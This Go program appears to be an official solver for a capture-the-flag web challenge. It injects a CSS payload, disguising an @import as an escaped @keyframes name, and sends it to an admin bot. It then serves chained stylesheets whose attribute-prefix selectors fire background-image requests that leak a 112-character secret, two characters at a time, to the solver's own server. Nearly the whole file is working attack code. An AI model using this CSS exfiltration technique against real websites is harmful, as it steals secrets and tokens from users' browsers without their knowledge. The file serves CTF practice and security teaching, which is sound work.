// Copyright 2024 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"text/template"
	"time"
)

const (
	alphabet       = "0123456789abcdef"
	alphabetLength = len(alphabet)
	secretLength   = 112
)

var (
	challengeURL = flag.String("challenge-url", "", "the base url of the challenge")
	solverURL    = flag.String("solver-url", "", "the base url of this solver")
	port         = flag.Int("port", 9191, "port to listen for this solver")
)

type potentialSecret struct{ Secret, StealURL string }

type stealCSS struct {
	AllLayerNames      []string
	LayerName, NextURL string
	PotentialSecrets   []potentialSecret
}

var templateFuncs = template.FuncMap{"join": strings.Join}

var stealCSSTemplateContent = strings.TrimSpace(`
{{if .AllLayerNames -}}
  @layer {{join .AllLayerNames ","}};
{{- end}}
{{if .NextURL -}}
  @import '{{ .NextURL }}';
{{- end}}

@layer {{.LayerName}} {
  {{ range .PotentialSecrets  -}}
    :host-context(body[secret^='{{ .Secret }}']) { background: url({{ .StealURL }});}
  {{ end -}}
}
`)
var stealCSSTmpl = template.Must(
	template.New("").Funcs(templateFuncs).Parse(stealCSSTemplateContent),
)

func escapeCSS(ident string) string {
	out := strings.Builder{}
	for _, c := range ident {
		fmt.Fprintf(&out, "\\%x ", c)
	}
	return out.String()
}

func exploit() {
	keyframe := fmt.Sprintf("; @\\import '%s/css?index=0';", *solverURL)
	css := fmt.Sprintf("@keyframes %s {}", escapeCSS(keyframe))
	payload := fmt.Sprintf("<style>%s</style>", css)
	exploitURL := *challengeURL + "/share?body=" + url.QueryEscape(payload)
	shareAdminURL := *challengeURL + "/share-with-admin?body=" + url.QueryEscape(payload)

	fmt.Fprintln(os.Stderr, "Payload:", payload)
	fmt.Fprintln(os.Stderr, "Exploit URL:", exploitURL)
	fmt.Fprintln(os.Stderr, "Share Admin URL:", shareAdminURL)

	http.Get(shareAdminURL)
}

func layerName(index int) string {
	return fmt.Sprintf("c%d", index)
}

func allLayerNames() []string {
	ret := make([]string, secretLength)
	for i := range ret {
		ret[i] = layerName(i)
	}
	return ret
}

func twoCharsAtATime() []string {
	ret := make([]string, alphabetLength*alphabetLength)
	for i, c1 := range alphabet {
		for j, c2 := range alphabet {
			chars := string(c1) + string(c2)
			ret[i*alphabetLength+j] = chars
		}
	}
	return ret
}

func main() {
	flag.Parse()
	if *challengeURL == "" || *solverURL == "" {
		fmt.Fprintln(os.Stderr, "--chalenge-url and --solver-url are mandatory")
		os.Exit(1)
	}
	finalSecretChan := make(chan string)
	secretChan := make(chan string)
	byTwoChars := twoCharsAtATime()

	http.HandleFunc("/css", func(w http.ResponseWriter, r *http.Request) {
		index, err := strconv.Atoi(r.URL.Query().Get("index"))
		if err != nil || index%2 == 1 {
			w.WriteHeader(http.StatusBadRequest)
			w.Write([]byte("bad index"))
			return
		}
		data := stealCSS{
			LayerName:        layerName(index),
			PotentialSecrets: make([]potentialSecret, alphabetLength*alphabetLength),
		}
		secret := ""
		if index > 0 {
			secret = <-secretChan
		}
		nextIndex := index + 2
		if nextIndex < secretLength-1 {
			data.NextURL = fmt.Sprintf("%s/css?index=%d", *solverURL, nextIndex)
		}
		if index == 0 {
			data.AllLayerNames = allLayerNames()
		}
		for i, chars := range byTwoChars {
			secret := secret + chars
			data.PotentialSecrets[i].Secret = secret
			data.PotentialSecrets[i].StealURL = *solverURL + "/steal?secret=" + secret

		}
		w.Header().Add("content-type", "text/css; charset=utf-8")
		stealCSSTmpl.Execute(w, data)

	})
	http.HandleFunc("/steal", func(w http.ResponseWriter, r *http.Request) {
		secret := r.URL.Query().Get("secret")
		if len(secret) == secretLength {
			finalSecretChan <- secret
		} else {
			secretChan <- secret
		}
		fmt.Fprintln(os.Stderr, "new secret: ", secret)
	})

	go func() {
		addr := fmt.Sprintf(":%d", *port)
		if err := http.ListenAndServe(addr, nil); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
	}()

	flagChan := make(chan string)
	go func() {
		time.Sleep(10 * time.Millisecond)
		exploit()
		secret := <-finalSecretChan
		resp, err := http.Get(*challengeURL + "/check-secret?secret=" + secret)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		flagChan <- string(body)
	}()
	flag := <-flagChan
	fmt.Println("FINAL FLAG:", flag)
	os.Exit(0)
}
